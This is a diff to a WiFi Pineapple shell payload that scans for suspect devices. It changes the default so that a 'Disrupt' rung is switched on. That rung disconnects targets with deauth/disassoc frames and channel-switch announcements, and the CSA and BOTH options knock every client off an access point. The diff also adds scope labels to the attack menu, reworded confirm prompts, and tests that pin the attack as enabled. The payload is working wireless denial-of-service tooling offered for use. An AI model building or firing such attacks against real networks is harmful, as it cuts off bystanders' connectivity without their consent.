@@ -5,11 +5,13 @@
 #              a 0-100 confidence scale, and (on request) locks on one suspect to test whether it
 #              is streaming (Watch), whether it reacts to movement (Stimulus test) or where it is
 #              (Locate). Identity scan is passive and free; Watch/Locate pause Recon hopping for
-#              the duration of the lock. No LAN join. With RESPONSE=1 a fourth rung appears on the
-#              device card: read the target's PMF/beacon-protection posture from its own beacon,
-#              then disconnect it with deauth+disassoc, channel-switch announcements, or all three,
-#              and judge from Recon whether it actually went quiet. RESPONSE defaults to 0, in
-#              which case nothing is transmitted and the device card is unchanged.
+#              the duration of the lock. No LAN join. A fourth rung on the device card, Disrupt,
+#              reads the target's PMF/beacon-protection posture from its own beacon, then
+#              disconnects it with deauth+disassoc, channel-switch announcements, or all three,
+#              and judges from Recon whether it actually went quiet. RESPONSE defaults to 1, so
+#              Disrupt is present; set it to 0 (Settings -> Response settings) for a recon-only
+#              run that transmits nothing. Every transmit sits behind a confirm by default, and
+#              only DEAUTH on a client row is targeted -- CSA and BOTH hit the whole BSS.
 # Author: tsuinami-1112
 # Version: 1.0
 # Category: reconnaissance
@@ -91,7 +93,7 @@ RECON_IF="wlan1mon"     # PineAP monitor radio (tri-band)
 INJ_SYSFS="/sys/class/ieee80211"   # phy list for the regulatory probe (the laptop harness points this at a fixture)
 NET_SYSFS="/sys/class/net"         # netdev tree the probe resolves RECON_IF's phy from (the laptop harness points this at a fixture)
 # response rung (recon+response). RESPONSE=0 keeps the payload recon-only and silent.
-RESPONSE=0              # * master switch for the response rung (0 = recon only)
+RESPONSE=1              # * master switch for the response rung (0 = recon only, transmits nothing)
 RESPONSE_CONFIRM=1      # * blocking confirmation dialog before any transmit (0 = act on accept alone)
 AUTO_RESPOND=0          # * let the funnel offer Disrupt by itself (needs RESPONSE=1; 0 = manual only)
 # shellcheck disable=SC2034
@@ -494,26 +496,43 @@ posture_from_caps() {   # posture_from_caps <rsncaps_hex|-> <extcap_hex|-> <band
 }
 
 # The three operator-selectable attacks. The badge advises; it never decides.
-#   DEAUTH  PINEAPPLE_DEAUTH_CLIENT     [bssid] [target] [channel]  deauth + disassoc, TARGETED
-#   CSA     PINEAPPLE_DEAUTH_CLIENT_CSA [bssid] [channel]           channel-switch announcements
-#   BOTH    PINEAPPLE_DEAUTH_CLIENT_ALL [bssid] [target] [channel]  all three frame types
+#   DEAUTH  PINEAPPLE_DEAUTH_CLIENT     [bssid] [target] [channel]  deauth + disassoc, one client
+#   CSA     PINEAPPLE_DEAUTH_CLIENT_CSA [bssid] [channel]           channel switch, WHOLE BSS
+#   BOTH    PINEAPPLE_DEAUTH_CLIENT_ALL [bssid] [target] [channel]  all three types, WHOLE BSS
 #
-# BOTH IS NOT TARGETED, despite the [target] in its documented signature above -- that signature
-# is hak5cmd's help text, and the help text is wrong. The handler behind it, pineAPdDeauthAll,
-# parses ONE MAC where pineAPdDeauth parses two, and its request struct carries no target field
-# (same arg frame, alloc size class and handler size as the CSA handler, not the deauth one).
-# resp_fire still passes three positionals; Go's json.Unmarshal drops the unknown one silently.
-# So BOTH hits EVERY client on the BSSID while DEAUTH beside it in the same menu hits one.
-# Note posture_opts lists BOTH first on the common badges and pick_list preselects element 0,
-# so the broad attack is the default.  Readings [V] from the 1.1.3 and 2.0.0 daemons; the
-# "parses the bssid, discards the target" conclusion is [A] -- falsify by firing BOTH at one
-# client among several and seeing whether the others stay associated.
+# ONLY DEAUTH IS TARGETED, and only on a client row. attack_scope() below is the one place that
+# decides; the picker's ' bss' marker and the pre-transmit confirm both read it, so the breadth is
+# stated where the operator chooses and again before anything is sent.
+#   CSA has no [target] argument at all, so its breadth is certain from the signature.  [V]
+#   BOTH has one in hak5cmd's help text, and the help text is wrong: pineAPdDeauthAll parses ONE
+#        MAC where pineAPdDeauth parses two, and its request struct carries no target field. The
+#        discriminating measurements are in CLAUDE.md "2.0.0-stable, analysed"; the frame split
+#        that carries them is StartDeauth 32 against StartDeauthAll/StartDeauthCsa 28.  Readings
+#        [V] from the 1.1.3 and 2.0.0 daemons; "parses the bssid, discards the target" is [A] --
+#        falsify by firing BOTH at one client among several and seeing whether the others stay
+#        associated. resp_fire still passes three positionals; json.Unmarshal drops the extra.
+#   NB the three pineAPd* HTTP handlers share one 16-byte http.HandlerFunc frame, so the frame
+#      does NOT discriminate among them -- an earlier revision of this comment said it did, and
+#      attributed the 32-vs-28 split to the wrong trio.
+# posture_opts still orders by efficacy (best first), and pick_list preselects element 0, so a
+# BSS-wide attack is the default on the common badges. That is deliberate: the marker and the
+# confirm carry the breadth, rather than demoting the attack most likely to work.
 response_cmd() {
   case "$1" in
     DEAUTH) printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
     CSA)    printf 'PINEAPPLE_DEAUTH_CLIENT_CSA' ;;
     BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT_ALL' ;;
     *)      printf '' ;;
+  esac
+}
+
+# attack_scope <attack key> -> cli | bss.  Reads R_TARGET, so call it after resp_target.
+# DEAUTH is the only command that takes a target it honours, and an AP row resolves R_TARGET to
+# broadcast, so every attack on one is BSS-wide regardless of which key is picked.
+attack_scope() {
+  case "$1" in
+    DEAUTH) [ "$R_TARGET" = 'ff:ff:ff:ff:ff:ff' ] && printf 'bss' || printf 'cli' ;;
+    *)      printf 'bss' ;;
   esac
 }
 
@@ -1944,8 +1963,9 @@ locate_target() {
   return 0
 }
 # --- response rung begin ---
-# Operator-driven disconnect. Nothing transmits unless RESPONSE=1 AND the operator picks an attack
-# from the device card; there is no automatic path from a detection to the air.
+# Operator-driven disconnect. RESPONSE defaults to 1, so the rung is present; nothing transmits
+# until the operator picks an attack and clears the confirm. There is no path from a detection to
+# the air that does not pass through a dialog -- AUTO_RESPOND only raises the offer, never fires it.
 RESP_HDR='#epoch|mac|role|bssid|target|ch|band|badge|rsn_caps|beacon_prot|attack|cmd|lock|pk_before|pk_after|verdict'
 R_BSSID=""; R_TARGET=""; R_CH=0; R_BAND='?'
 
@@ -2103,7 +2123,7 @@ disrupt_row() {   # a cached badge is free to show; an uncached one is not worth
 }
 
 disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon says will work
-  local mac="$1" badge opts k exp items=() pickmap=() i=0 choice
+  local mac="$1" badge opts k exp scope items=() pickmap=() i=0 choice
   if ! resp_target "$mac"; then
     LOG red "nothing to attack: no associated BSS or no channel for $mac"; return 0
   fi
@@ -2122,7 +2142,8 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
   fi
   for k in $opts; do
     exp=$(posture_expect "$badge" "$k")
-    items+=("$(printf '%s (%s)' "$k" "$exp")"); pickmap+=("$k"); i=$((i + 1))
+    [ "$(attack_scope "$k")" = bss ] && scope=' bss' || scope=''
+    items+=("$(printf '%s%s (%s)' "$k" "$scope" "$exp")"); pickmap+=("$k"); i=$((i + 1))
   done
   pick_list "Disrupt [$badge] ${R_TARGET:9}" "${items[0]}" "${items[@]}" "Back" || return 0
   [ "$PICK" = Back ] && return 0
@@ -2130,7 +2151,12 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
   for ((i = 0; i < ${#items[@]}; i++)); do [ "$PICK" = "${items[$i]}" ] && choice="${pickmap[$i]}"; done
   [ -n "$choice" ] || return 0
   if [ "$RESPONSE_CONFIRM" = 1 ]; then
-    confirm "$choice on ${R_TARGET:9} via ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
+    # Name the real blast radius: "CSA on <one client>" would be a lie, the command has no target.
+    if [ "$(attack_scope "$choice")" = bss ]; then
+      confirm "$choice on EVERY client of ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
+    else
+      confirm "$choice on ${R_TARGET:9} via ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
+    fi
   fi
   resp_fire "$mac" "$choice" "$badge"
 }
@@ -2442,6 +2468,21 @@ IWFIX
   st "opts beacon prot offers none" "$(posture_opts NONE)" ""
   st "opts no-inject offers none"  "$(posture_opts NOINJ)" ""
   st "opts unread leads CSA"       "$(posture_opts '?')"   "CSA BOTH DEAUTH"
+
+  # The shipped default is recon+response. A silent revert to 0 would disarm the rung with no
+  # other symptom, so pin it here rather than trusting the config block to stay put.
+  st "RESPONSE ships on"           "$RESPONSE"             "1"
+  st "RESPONSE_CONFIRM ships on"   "$RESPONSE_CONFIRM"     "1"
+  st "AUTO_RESPOND ships off"      "$AUTO_RESPOND"         "0"
+
+  # attack_scope: only DEAUTH on a client row is targeted; everything else is the whole BSS.
+  R_TARGET=aa:00:00:00:00:11
+  st "scope DEAUTH on a client"    "$(attack_scope DEAUTH)" "cli"
+  st "scope CSA is bss-wide"       "$(attack_scope CSA)"    "bss"
+  st "scope BOTH is bss-wide"      "$(attack_scope BOTH)"   "bss"
+  R_TARGET=ff:ff:ff:ff:ff:ff
+  st "scope DEAUTH on an AP row"   "$(attack_scope DEAUTH)" "bss"
+  R_TARGET=
   st "expect deauth vs no PMF"     "$(posture_expect 'D+C' DEAUTH)"  "works"
   st "expect deauth vs optional PMF" "$(posture_expect 'D?+C' DEAUTH)" "partial"
   st "expect deauth vs required PMF" "$(posture_expect C DEAUTH)"    "blocked"
